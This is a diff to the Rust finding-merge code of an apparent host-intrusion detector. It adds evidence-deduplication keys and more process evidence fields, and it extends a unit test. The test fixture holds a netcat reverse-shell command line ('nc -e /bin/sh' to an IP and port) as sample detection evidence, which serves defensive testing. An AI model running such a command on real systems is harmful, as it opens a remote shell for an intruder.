@@ -1,6 +1,9 @@
 use sentinel_core::{Evidence, Finding};
 use std::collections::{BTreeMap, BTreeSet};
 
+const RESOURCE_MERGE_DEDUP_KEYS: &[&str] = &["path", "change", "current_hash"];
+const PROCESS_MERGE_DEDUP_KEYS: &[&str] = &["exe_path", "cmdline", "name"];
+
 /// Coalesce findings that describe the same underlying resource or runtime entity.
 ///
 /// Detectors intentionally stay independent, so a systemd unit change can be
@@ -69,7 +72,7 @@ fn merge_resource_findings(mut findings: Vec<Finding>) -> Finding {
     findings.sort_by_key(|finding| rule_priority(&finding.rule_id));
     let mut primary = findings.remove(0);
     let evidence = merge_evidence(&primary, &findings);
-    primary = primary.with_evidence(evidence);
+    primary = primary.with_evidence_deduped_by(evidence, RESOURCE_MERGE_DEDUP_KEYS);
     primary.impact = merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
         &item.impact
     });
@@ -88,7 +91,7 @@ fn merge_process_findings(mut findings: Vec<Finding>) -> Finding {
     findings.sort_by_key(|finding| process_rule_priority(&finding.rule_id));
     let mut primary = findings.remove(0);
     let evidence = merge_process_evidence(&primary, &findings);
-    primary = primary.with_evidence(evidence);
+    primary = primary.with_evidence_deduped_by(evidence, PROCESS_MERGE_DEDUP_KEYS);
     primary.impact = merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
         &item.impact
     });
@@ -144,11 +147,27 @@ fn merge_process_evidence(primary: &Finding, related: &[Finding]) -> Vec<Evidenc
         "pid",
         "ppid",
         "name",
+        "parent_name",
         "exe_path",
         "cmdline",
         "cwd",
         "euid",
+        "exe_uid",
+        "exe_gid",
+        "exe_size",
+        "exe_hash_blake3",
+        "package_owner",
+        "systemd_unit",
+        "systemd_execstart",
+        "container_context",
         "socket_fd_count",
+        "cpu_percent",
+        "cpu_total_seconds",
+        "process_age_seconds",
+        "outbound_connection_count",
+        "public_outbound_count",
+        "outbound_remote_ports",
+        "package_activity_recent",
     ] {
         push_first_evidence(&mut evidence, primary, related, key);
     }
@@ -321,8 +340,12 @@ mod tests {
                 Evidence::new("pid", "42"),
                 Evidence::new("ppid", "1"),
                 Evidence::new("name", "sh"),
+                Evidence::new("parent_name", "systemd"),
                 Evidence::new("exe_path", "/tmp/.x/sh"),
                 Evidence::new("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444"),
+                Evidence::new("systemd_unit", "x.service"),
+                Evidence::new("exe_hash_blake3", "abc123"),
+                Evidence::new("public_outbound_count", "1"),
                 Evidence::new("risk_score", "120"),
                 Evidence::new("risk_reasons", "network execution bridge"),
                 Evidence::new("risk_features", "fd_bridge"),
@@ -338,6 +361,17 @@ mod tests {
             .evidence
             .iter()
             .any(|item| item.key == "risk_score" && item.value == "120"));
+        for key in [
+            "parent_name",
+            "systemd_unit",
+            "exe_hash_blake3",
+            "public_outbound_count",
+        ] {
+            assert!(
+                findings[0].evidence.iter().any(|item| item.key == key),
+                "missing merged evidence key {key}"
+            );
+        }
     }
 
     #[test]
